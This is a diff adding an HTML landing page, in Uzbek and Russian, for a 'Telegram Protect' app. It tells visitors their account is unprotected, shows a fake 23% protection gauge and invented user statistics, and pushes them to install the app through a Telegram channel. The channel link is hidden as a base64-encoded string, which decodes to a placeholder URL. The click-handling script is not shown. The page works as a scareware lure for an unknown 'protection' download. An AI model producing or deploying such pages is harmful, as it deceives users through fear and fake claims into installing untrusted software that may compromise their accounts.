@@ -1,0 +1,107 @@
+<!doctype html>
+<html lang="uz">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
+  <title>Telegram Himoya — Telegram Protect</title>
+  <meta name="description" content="Himoya tizimini o‘rnating va akkauntingizni xavfsiz qiling. Установите защиту Telegram и обезопасьте свой аккаунт.">
+  <meta property="og:title" content="Telegram Himoya — Telegram Protect">
+  <meta property="og:description" content="Sizning Telegram akkauntingiz himoyasiz! Установите защиту и не дайте мошенникам получить доступ.">
+  <meta property="og:type" content="website">
+  <meta property="og:image" content="assets/og-image.png">
+  <meta property="og:url" content="./">
+  <meta name="theme-color" content="#0b1220">
+  <link rel="icon" href="assets/icon.svg" type="image/svg+xml">
+  <link rel="preload" as="image" href="assets/hero-lock.svg">
+  <link rel="stylesheet" href="assets/styles.css">
+</head>
+<body>
+  <header class="container header">
+    <div class="brand">
+      <img src="assets/icon.svg" alt="" width="28" height="28">
+      <span class="brand-name">Telegram Protect</span>
+    </div>
+    <nav class="lang-switch" aria-label="Language switch">
+      <button id="lang-uz" class="lang-btn active" data-lang="uz">UZ</button>
+      <button id="lang-ru" class="lang-btn" data-lang="ru">RU</button>
+    </nav>
+  </header>
+
+  <main class="container main">
+    <section class="hero card">
+      <div class="hero-text">
+        <h1 data-i18n="title">
+          Sizning Telegram akkauntingiz himoyasiz!
+        </h1>
+        <p class="lead" data-i18n="subtitle">
+          Himoya tizimini o‘rnating va akkauntingizni xavfsiz holatga keltiring.
+        </p>
+        <ul class="benefits">
+          <li><span class="dot"></span><span data-i18n="b1">Noqonuniy kirishlarni aniqlash</span></li>
+          <li><span class="dot"></span><span data-i18n="b2">Bildirishnomalar va tavsiyalar</span></li>
+          <li><span class="dot"></span><span data-i18n="b3">1 bosishda o‘rnatish</span></li>
+        </ul>
+        <div class="stats">
+          <div class="stat">
+            <div class="stat-value">3&nbsp;000+</div>
+            <div class="stat-label" data-i18n="stat1">so‘nggi 24 soat ichida</div>
+          </div>
+          <div class="stat">
+            <div class="stat-value">97%</div>
+            <div class="stat-label" data-i18n="stat2">foydalanuvchi tavsiya qiladi</div>
+          </div>
+        </div>
+        <div class="cta-wrap">
+          <button id="cta" class="btn-primary" data-i18n="cta">O‘rnatish</button>
+          <p class="note" data-i18n="note">
+            Yuklab olish Telegram kanali orqali amalga oshiriladi
+          </p>
+        </div>
+      </div>
+      <div class="hero-visual">
+        <img src="assets/hero-lock.svg" alt="Telegram himoyasi" class="hero-img" decoding="async">
+        <div class="shield">
+          <span class="shield-badge">23%</span>
+          <span class="shield-text" data-i18n="risk">Himoya darajasi</span>
+        </div>
+      </div>
+    </section>
+
+    <section class="features grid">
+      <article class="feature card">
+        <h3 data-i18n="f1t">Tez va oson</h3>
+        <p data-i18n="f1d">Ilovani o‘rnating, tugmani bosing — himoya yoqiladi.</p>
+      </article>
+      <article class="feature card">
+        <h3 data-i18n="f2t">Qulay xabarnomalar</h3>
+        <p data-i18n="f2d">Shubhali faollik bo‘lsa, darhol ogohlantiramiz.</p>
+      </article>
+      <article class="feature card">
+        <h3 data-i18n="f3t">Rasmiy ko‘rinish</h3>
+        <p data-i18n="f3d">Toza dizayn, hech qanday ortiqcha narsalarsiz.</p>
+      </article>
+    </section>
+  </main>
+
+  <div class="sticky-cta">
+    <button id="sticky-cta" class="btn-primary" data-i18n="cta">O‘rnatish</button>
+  </div>
+
+  <noscript>
+    <div class="noscript container card">
+      <p>JavaScript is disabled. Please open the Telegram channel manually: <span>t.me/your_channel_or_post</span></p>
+    </div>
+  </noscript>
+
+  <footer class="container footer">
+    <p class="muted" data-i18n="disclaimer">
+      Disclaimer: Ushbu sayt Telegram bilan bog‘liq emas. Bu sahifa akkaunt xavfsizligi haqida ma’lumot beradi.
+    </p>
+  </footer>
+
+  <script>
+    window.TELEGRAM_URL_B64 = "aHR0cHM6Ly90Lm1lL3lvdXJfY2hhbm5lbF9vcl9wb3N0";
+  </script>
+  <script src="assets/script.js"></script>
+</body>
+</html>
